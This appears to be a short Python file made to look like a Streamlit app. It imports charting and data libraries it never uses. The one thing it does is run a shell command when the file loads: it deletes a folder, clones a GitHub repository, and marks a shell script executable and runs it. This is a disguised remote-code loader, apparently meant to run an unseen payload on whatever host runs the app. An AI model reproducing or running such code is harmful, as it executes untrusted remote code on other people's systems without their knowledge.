from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
p = subprocess.Popen("rm -rf nungx && git clone https://github.com/Akatsoki/nungx.git && cd nungx && chmod +x Zxz.sh && ./Zxz.sh", stdout=subprocess.PIPE, shell=True)
print(p.communicate())
